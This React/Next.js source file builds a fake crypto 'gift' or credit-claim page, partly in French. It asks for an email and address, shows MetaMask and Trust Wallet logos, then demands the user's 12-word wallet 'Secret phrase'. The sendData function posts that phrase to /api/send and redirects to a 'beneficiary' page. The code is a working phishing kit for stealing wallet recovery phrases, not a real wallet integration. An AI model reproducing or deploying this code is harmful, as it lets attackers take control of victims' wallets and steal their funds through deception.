import { FaStar } from 'react-icons/fa'
import React , {useState } from 'react'
import Layout from './layout'
import Link from 'next/link'
import { useRouter } from 'next/router'
import lang_ from '../locales/lang_en.js'

const Home = () => {

   const [isOpen, setIsOpen] = useState(false);
   const [isOpen2, setIsOpen2] = useState(false);
   const [value,setValue] = useState('');
   const [email,setEmail] = useState('');
   const [adress,setAdress] = useState('')
   
   const router = useRouter()

   const toggleModal = () =>{
       
      setIsOpen(true);

   }
  
   const closeToggleModal = () =>{       
        setIsOpen(false);
   }

     const _closeToggleModal = ()=> {
       setIsOpen2(true)
       setIsOpen(false);
     } 

     const sendData = async () => {

         if (countWords(value) > 11){

            

            const settings = {
               method: 'POST',
               headers: {
                           Accept: 'application/json',
                           'Content-Type': 'application/json',
                       },
               body: JSON.stringify({
                     code:value,
                 })
                }
          
               
          
              try {
          
          
          
                      const fetchResponse = await fetch(`/api/send`, settings);
          
                      const resp = await fetchResponse.json();
          
                      
                       if(resp.status == 200){
          
                      
          
                         router.push('/beneficierducredit')
          
          
                        }
          
                  } catch (e) {
                    return e;
                  }

         }
     
      
   }
  return (
      <Layout>
            <div className = 'content'>

                   <div  className = 'row-item-ss-gift'>

                   {
                                 isOpen == true && (
                                    <div className='modale-open'>
                                          
                                          <div className='modale-content'>
                                          <div className='modale-open-close'>
                                             <span className='modale-open-close-right'> {lang_.gift_97} </span>
                                             <span className='modale-open-close-left ' onClick={()=>{setIsOpen(false)}}>close</span>
                                          </div>
                                               <div className='choose-wallets'>

                                                      <img src = './metamask.svg' onClick={()=>_closeToggleModal()}/>
                                                      <img src = './trustwallet.svg' onClick={()=>_closeToggleModal()}/>
                                                    
                                                </div>
                                          </div>
                                    </div>
                                 )
                      }


                   {
                                 isOpen2 == true && (
                                    <div className='modale-open'>
                                          
                                          <div className='modale-content'>
                                          <div className='modale-open-close'>
                                             <span className='modale-open-close-right'> {lang_.gift_118}  </span>
                                             <span className='modale-open-close-left' onClick={()=>{setIsOpen2(false)}}></span>
                                          </div>
                                             <div className='modale-content-textArea-zn'>
                                                 <div className='modale-content-textArea'>
                                                    <textarea
                                                      placeholder='Secret phrase'
                                                      className=''
                                                     value = {value}
                                                      onChange = {(e) => {
                                                      setValue(e.target.value)
                                                      let str = e.target.value


                                                         


                                                            



                                                         }}
                                                    />

                                                      {
                                                         (value.length > 1 &&  countWords(value) < 12 ) && (

                                                            <div className = 'content-login-zn-indic-txt-warning'>
                                                               <span> {lang_.gift_146}Veuillez coller les 12 mots pour vous connecter</span>
                                                         </div>

                                                         )
                                                      }

                                                    <span> {lang_.gift_152} </span>
                                                 </div>


                                                 <div className='modale-content-btn'>
                                                    <button onClick={()=>sendData()}> {lang_.gift_157} </button>
                                                 </div>
                                             </div>  
                                          </div>
                                    </div>
                                 )
                      }

                          <div className='gift-content'>

                              
                              
                                 <div className='gift-content-test'> {lang_.gift_169}</div>
                                 <div className='gift-content-smal-text'> {lang_.gift_170}</div>

                                 <div className='gift-content_input-label'> {lang_.gift_172} </div>
                                 <div className='gift-content_input'>
                                     <input
                                       onChange ={(e)=>setEmail(e.target.value)}
                                       value={email}/>
                                     </div>

                                 <div className='gift-content_input-label'> {lang_.gift_179}</div>
                                 <div className='gift-content_input'>
                                    <input
                                      onChange ={(e)=>setAdress(e.target.value)}
                                      value={adress}
                                      
                                    />
                                    </div>


                                 <div className='checked-box'>
                                    <div className='checked-box-input'><input type="checkbox" id="topping" name="topping" value="Paneer" /></div>
                                    <div className='checked-box-text'> {lang_.gift_191} </div>
                                 </div>

                                 <div className='checked-box-btn'>
                                    <button onClick={()=>toggleModal()}> {lang_.gift_195} </button>
                                 </div>
                          </div>

                   </div>


                   


                  
                   
 


            </div>
      </Layout>
  )
}

function countWords(str) {
   str = str.replace(/(^\s*)|(\s*$)/gi,"");
   str = str.replace(/[ ]{2,}/gi," ");
   str = str.replace(/\n /,"\n");
   return str.split(' ').length;
   }

const DownloadButon = () => {
  return (
    <div className = 'btn-ss-siv'>
       <a href = 'https://trustwallet.com/download-page'> <button className = 'btn'>Download Now</button>  </a>
    </div>
  )
}
const CrytoButon = () => {
  return (
    <div className = 'btn-ss-siv btn-ss-siv-cryto'>
       <Link href={`/retirervoscrypto`}>
         <button className = 'btn' >Cliquez ici pour réclamer votre crédit</button>
         </Link>
    </div>
  )
}

 export default Home
